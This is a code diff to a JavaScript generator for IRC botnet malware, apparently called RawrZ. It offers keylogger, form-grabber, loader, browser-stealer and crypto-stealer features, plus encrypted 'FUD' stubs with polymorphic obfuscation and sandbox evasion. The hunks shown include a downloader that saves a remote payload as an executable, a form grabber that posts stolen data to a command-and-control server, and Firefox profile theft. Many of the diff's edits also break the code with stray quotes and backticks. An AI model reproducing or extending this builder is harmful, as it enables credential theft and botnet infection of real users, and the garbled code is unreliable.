@@ -6,12 +6,26 @@ const BurnerEncryptionEngine = require('./burner-encryption-engine');
 const TemplateGenerator = require('./template-generator');
 
 class IRCBotGenerator {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
+
     constructor() {
         this.supportedLanguages = ['cpp', 'python', 'go', 'rust', 'csharp', 'javascript'];
         this.availableFeatures = ['fileManager', 'processManager', 'systemInfo', 'networkTools', 'keylogger', 'screenCapture', 'formGrabber', 'loader', 'webcamCapture', 'audioCapture', 'browserStealer', 'cryptoStealer'];
-        this.customFeatures = new Map();
-        this.featureTemplates = new Map();
-        this.templates = new Map();
+        this.customFeatures = this.memoryManager.createManagedCollection('customFeatures', 'Map', 100);
+        this.featureTemplates = this.memoryManager.createManagedCollection('featureTemplates', 'Map', 100);
+        this.templates = this.memoryManager.createManagedCollection('templates', 'Map', 100);
         this.botStats = {
             totalGenerated: 0,
             successfulGenerations: 0,
@@ -46,8 +60,8 @@ class IRCBotGenerator {
             this.templates.set(template.id, template);
         }
 
-        logger.info(`Loaded ${templates.length} bot templates`);
-        logger.info(`Loaded ${this.availableFeatures.length} bot features`);
+        logger.info("Loaded " + templates.length + " bot templates");
+        logger.info("Loaded " + this.availableFeatures.length + " bot features");
     }
 
     async generateBot(config, features, extensions) {
@@ -59,7 +73,7 @@ class IRCBotGenerator {
             const botCode = this.generateBotCode(config, features, extension, timestamp, botId);
             generatedBots[extension] = {
                 code: botCode,
-                filename: `${(config.name || 'ircbot').toLowerCase()}.${this.getFileExtension(extension)}`,
+                filename: `${(config.name || 'ircbot').toLowerCase()}.this.getFileExtension(extension)`,
                 language: extension,
                 size: botCode.length
             };
@@ -93,8 +107,8 @@ class IRCBotGenerator {
         customFeatures.forEach(featureName => {
             const customFeature = this.customFeatures.get(featureName);
             if (customFeature && customFeature.code && customFeature.code.cpp) {
-                customFeatureCode += `        ${customFeature.code.cpp.init || ''}\n`;
-                customFeatureMethods += `    ${customFeature.code.cpp.method || ''}\n`;
+                customFeatureCode += "        " + customFeature.code.cpp.init || '' + "\n";
+                customFeatureMethods += "    " + customFeature.code.cpp.method || '' + "\n";
             }
         });
         
@@ -175,7 +189,7 @@ class RawrZBot:
     ${formGrabberCode}
     ${loaderCode}
     ${browserStealerCode}
-    ${cryptoStealerCode}
+    " + cryptoStealerCode + "
 
 if __name__ == "__main__":
     bot = RawrZBot()
@@ -218,7 +232,7 @@ class RawrZBot {
     ${formGrabberCode}
     ${loaderCode}
     ${browserStealerCode}
-    ${cryptoStealerCode}
+    " + cryptoStealerCode + "
 }
 
 const bot = new RawrZBot();
@@ -231,7 +245,7 @@ bot.run();`;
 // Bot ID: ${botId}
 // Please select a supported language for full implementation.
 // Core Features: ${coreFeatures.join(', ')}
-// Custom Features: ${customFeatures.join(', ')}`;
+// Custom Features: customFeatures.join(', ')`;
     }
 
     async testBot(config) {
@@ -278,11 +292,11 @@ bot.run();`;
             };
 
             this.customFeatures.set(featureName, customFeature);
-            logger.info(`Custom feature '${featureName}' added successfully`);
+            logger.info("Custom feature '" + featureName + "' added successfully");
             
             return { success: true, feature: customFeature };
         } catch (error) {
-            logger.error(`Failed to add custom feature '${featureName}':`, error);
+            logger.error("Failed to add custom feature '" + featureName + "':", error);
             throw error;
         }
     }
@@ -291,7 +305,7 @@ bot.run();`;
         try {
             const existingFeature = this.customFeatures.get(featureName);
             if (!existingFeature) {
-                throw new Error(`Custom feature '${featureName}' not found`);
+                throw new Error("Custom feature '" + featureName + "' not found");
             }
 
             const updatedFeature = {
@@ -301,11 +315,11 @@ bot.run();`;
             };
 
             this.customFeatures.set(featureName, updatedFeature);
-            logger.info(`Custom feature '${featureName}' updated successfully`);
+            logger.info("Custom feature '" + featureName + "' updated successfully");
             
             return { success: true, feature: updatedFeature };
         } catch (error) {
-            logger.error(`Failed to update custom feature '${featureName}':`, error);
+            logger.error("Failed to update custom feature '" + featureName + "':", error);
             throw error;
         }
     }
@@ -313,15 +327,15 @@ bot.run();`;
     async removeCustomFeature(featureName) {
         try {
             if (!this.customFeatures.has(featureName)) {
-                throw new Error(`Custom feature '${featureName}' not found`);
+                throw new Error("Custom feature '" + featureName + "' not found");
             }
 
             this.customFeatures.delete(featureName);
-            logger.info(`Custom feature '${featureName}' removed successfully`);
+            logger.info("Custom feature '" + featureName + "' removed successfully");
             
-            return { success: true, message: `Custom feature '${featureName}' removed` };
+            return { success: true, message: "Custom feature '" + featureName + "' removed" };
         } catch (error) {
-            logger.error(`Failed to remove custom feature '${featureName}':`, error);
+            logger.error("Failed to remove custom feature '" + featureName + "':", error);
             throw error;
         }
     }
@@ -330,12 +344,12 @@ bot.run();`;
         try {
             const feature = this.customFeatures.get(featureName);
             if (!feature) {
-                throw new Error(`Custom feature '${featureName}' not found`);
+                throw new Error("Custom feature '" + featureName + "' not found");
             }
             
             return { success: true, feature };
         } catch (error) {
-            logger.error(`Failed to get custom feature '${featureName}':`, error);
+            logger.error("Failed to get custom feature '" + featureName + "':", error);
             throw error;
         }
     }
@@ -365,11 +379,11 @@ bot.run();`;
             };
 
             this.featureTemplates.set(templateName, template);
-            logger.info(`Feature template '${templateName}' created successfully`);
+            logger.info("Feature template '" + templateName + "' created successfully");
             
             return { success: true, template };
         } catch (error) {
-            logger.error(`Failed to create feature template '${templateName}':`, error);
+            logger.error("Failed to create feature template '" + templateName + "':", error);
             throw error;
         }
     }
@@ -378,12 +392,12 @@ bot.run();`;
         try {
             const template = this.featureTemplates.get(templateName);
             if (!template) {
-                throw new Error(`Feature template '${templateName}' not found`);
+                throw new Error("Feature template '" + templateName + "' not found");
             }
             
             return { success: true, template };
         } catch (error) {
-            logger.error(`Failed to get feature template '${templateName}':`, error);
+            logger.error("Failed to get feature template '" + templateName + "':", error);
             throw error;
         }
     }
@@ -401,15 +415,15 @@ bot.run();`;
     async deleteFeatureTemplate(templateName) {
         try {
             if (!this.featureTemplates.has(templateName)) {
-                throw new Error(`Feature template '${templateName}' not found`);
+                throw new Error("Feature template '" + templateName + "' not found");
             }
 
             this.featureTemplates.delete(templateName);
-            logger.info(`Feature template '${templateName}' deleted successfully`);
+            logger.info("Feature template '" + templateName + "' deleted successfully");
             
-            return { success: true, message: `Feature template '${templateName}' deleted` };
+            return { success: true, message: "Feature template '" + templateName + "' deleted" };
         } catch (error) {
-            logger.error(`Failed to delete feature template '${templateName}':`, error);
+            logger.error("Failed to delete feature template '" + templateName + "':", error);
             throw error;
         }
     }
@@ -452,7 +466,7 @@ bot.run();`;
                 generatedBots[extension] = {
                     code: fudStubCode,
                     originalCode: botCode,
-                    filename: `${(config.name || 'ircbot').toLowerCase()}_stub.${this.getFileExtension(extension)}`,
+                    filename: `${(config.name || 'ircbot').toLowerCase()}_stub.this.getFileExtension(extension)`,
                     language: extension,
                     size: fudStubCode.length,
                     encrypted: encryptionOptions.algorithm ? true : false,
@@ -507,7 +521,7 @@ bot.run();`;
         ];
         
         const randomVariant = polymorphicVariants[Math.floor(Math.random() * polymorphicVariants.length)];
-        return `${randomVariant}\n${code}`;
+        return `${randomVariant}\ncode`;
     }
 
     // Obfuscate strings in code
@@ -515,7 +529,7 @@ bot.run();`;
         // Simple string obfuscation - in real implementation would be more sophisticated
         return code.replace(/"([^"]+)"/g, (match, str) => {
             const obfuscated = Buffer.from(str).toString('base64');
-            return `Buffer.from("${obfuscated}", "base64").toString()`;
+            return `"Buffer.from(\"${obfuscated}\", \"base64\").toString()"`;
         });
     }
 
@@ -557,7 +571,7 @@ bot.run();`;
         auto start = std::chrono::high_resolution_clock::now();
         std::this_thread::sleep_for(std::chrono::milliseconds(100));
         auto end = std::chrono::high_resolution_clock::now();
-        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
+        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>`(end - start);
         if (duration.count() < 50) {
             // Too fast - likely in sandbox
             return;
@@ -733,14 +747,14 @@ bot.run();`;
 // Stub ID: ${stubId}
 // Encryption: ${encryptionOptions.algorithm || 'none'}
 
-#include <iostream>
-#include <windows.h>
-#include <string>
-#include <vector>
-#include <fstream>
-#include <sstream>
-#include <cstring>
-${encryptionOptions.algorithm ? '#include <openssl/aes.h>\n#include <openssl/evp.h>' : ''}
+#include <iostream>`
+#include <windows.h>`
+#include <string>`
+#include <vector>`
+#include <fstream>`
+#include <sstream>`
+#include <cstring>`
+${encryptionOptions.algorithm ? '#include <openssl/aes.h>`\n#include <openssl/evp.h>`' : ''}
 
 class RawrZStub {
 private:
@@ -763,7 +777,7 @@ public:
         std::cout << "RawrZ Stub ${stubId} initializing..." << std::endl;
         
         // Decrypt and execute bot code
-        std::string decryptedCode = this->decryptPayload();
+        std::string decryptedCode = this->`decryptPayload();
         this->executeBotCode(decryptedCode);
     }
     
@@ -797,7 +811,7 @@ private:
     }
     
     std::string decryptPayload() {
-        ${decryptionCode}
+        " + decryptionCode + "
         return decryptedPayload;
     }
     
@@ -920,7 +934,7 @@ class RawrZStub:
             pass
     
     def decrypt_payload(self):
-        ${decryptionCode}
+        " + decryptionCode + "
         return system_content
     
     def execute_bot_code(self, code):
@@ -974,7 +988,7 @@ class RawrZStub {
     }
     
     run() {
-        console.log(\`RawrZ Stub ${stubId} initializing...\`);
+        console.log(\"RawrZ Stub ${stubId} initializing...\");
         
         // Decrypt and execute bot code
         const decryptedCode = this.decryptPayload();
@@ -1043,7 +1057,7 @@ class RawrZStub {
     
     executeBotCode(code) {
         // Write decrypted code to temporary file
-        const tempFile = path.join(os.tmpdir(), \`temp_bot_\${process.pid}.js\`);
+        const tempFile = path.join(os.tmpdir(), `temp_bot_${process.pid}.js`);
         fs.writeFileSync(tempFile, code);
         
         try {
@@ -1079,7 +1093,7 @@ stub.run();`;
 
 // Currently Unavailable - Please select a supported language for full implementation.
 // Original bot code (${encryptionOptions.algorithm ? 'encrypted' : 'plaintext'}):
-${encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) : botCode}`;
+encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) : botCode`;
     }
 
     // Encryption helper methods
@@ -1254,7 +1268,7 @@ ${encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) 
                 char buffer[4096];
                 DWORD bytesRead;
                 std::ofstream file("temp_payload.exe", std::ios::binary);
-                while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+                while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead >` 0) {
                     file.write(buffer, bytesRead);
                 }
                 file.close();
@@ -1500,7 +1514,7 @@ ${encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) 
                         }
                         
                         // Send form data to C&C server
-                        fetch('http://${config.server}:${config.port}/formdata', {
+                        fetch('http://${config.server}:" + config.port + "/formdata', {
                             method: 'POST',
                             body: JSON.stringify(data)
                         });
@@ -1516,7 +1530,7 @@ ${encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) 
         } catch (error) {
             console.error('Form grabber error:', error);
         }
-    }`;
+    }";
     }
 
     // JavaScript Loader Code
@@ -1599,8 +1613,8 @@ ${encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) 
                     const profilePath = path.join(firefoxPath, profile);
                     if (fs.statSync(profilePath).isDirectory()) {
                         // Copy Firefox profile
-                        this.copyDirectory(profilePath, \`firefox_profile_\${profile}\`);
-                        console.log(\`Firefox profile \${profile} copied\`);
+                        this.copyDirectory(profilePath, "firefox_profile_" + profile);
+                        console.log("Firefox profile " + profile + " copied");
                     }
                 });
             }
